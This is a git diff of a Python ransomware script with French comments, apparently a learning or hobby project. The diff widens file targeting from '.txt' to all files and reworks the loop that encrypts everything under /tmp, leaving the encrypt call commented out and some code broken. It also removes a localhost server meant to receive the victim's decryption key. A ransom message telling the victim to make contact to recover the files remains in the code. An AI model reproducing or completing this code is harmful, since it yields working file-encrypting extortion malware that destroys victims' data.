@@ -23,7 +23,7 @@ class Ransomware:
 
         self.key = key
         self.cryptor = None
-        self.file_ext_targets = ['txt']
+        self.file_ext_targets = ["*"]
 
 
     def generate_key(self):
@@ -71,23 +71,25 @@ class Ransomware:
         for tmp, _, files in os.walk(tmp_dir):
             for f in files:
                 abs_file_path = os.path.join(tmp, f)
-        """
 
+        """   
+        for f in os.listdir(tmp_dir):   
 
-            # if not a file extension target
-               
-        for tmp, _, files in os.walk(tmp_dir):
-            if os.path.isfile(os.path.join(tmp, f)):
-                self.crypt_file(abs_file_path, encrypted=encrypted)
-            continue
+            if os.path.isfile(os.path.join(tmp_dir, f)):
+                abs_file_path = os.path.join(tmp, f)
+                print(abs_file_path)
 
-        """
-                if not abs_file_path.split('.')[-1] : #in self.file_ext_targets
-                    continue 
                 
-                self.crypt_file(abs_file_path, encrypted=encrypted)
+
         """
-        
+            # if not a file extension target
+                if not abs_file_path.split('.')[-1] in self.file_ext_targets:
+                    continue 
+        """
+            
+
+                #self.crypt_file(abs_file_path, encrypted=encrypted)
+
 
 
     def crypt_file(self, file_path, encrypted=False):
@@ -113,33 +115,7 @@ class Ransomware:
             f.write(data)
 
 
-"""
-Le serveur hébergera la clé de déchiffrement envoyé par la victime.
-"""
-class Server:
-    """
-    def __init__(self, server_address, port):
-        self.port = port
-        self.server_address = server_address
-    """
 
-
-    def launch_server(self, state):
-        self.port = 8080
-        self.server_address = ("127.0.0.1", self.port) #Création d'un serveur web en localhost
-
-        server = http.server.HTTPServer
-        handler = http.server.CGIHTTPRequestHandler
-        handler.cgi_directories = ["/"]
-        print("Serveur actif sur le port :", self.port)
-        httpd = server(self.server_address, handler)
-
-        if state == True:
-            return httpd.serve_forever()
-        else:
-            return httpd.shutdown()
-
-    
 if __name__ == '__main__':
 
     local_tmp = '/tmp' # emplacement dossier à chiffrer
@@ -157,7 +133,6 @@ if __name__ == '__main__':
     keyfile = args.keyfile
     
     rware = Ransomware()
-    server = Server()
 
     if action == 'decrypt':
         """
@@ -174,9 +149,6 @@ if __name__ == '__main__':
 
         print("Vous avez été sujet à un ransomware, veuillez nous contacter pour espérer retrouver vos fichiers dans /tmp. \n NE RELANCEZ PAS LE MAIN SINON VIS FICHIERS SERONT PERDUS.")    
         
-        #thread = threading.Thread(server.launch_server(True))
-        #thread.deamon = True
-        #thread.start() #Lancement du serveur Web
         rware.generate_key()
         print("coucou")
         rware.write_key('keyfile')
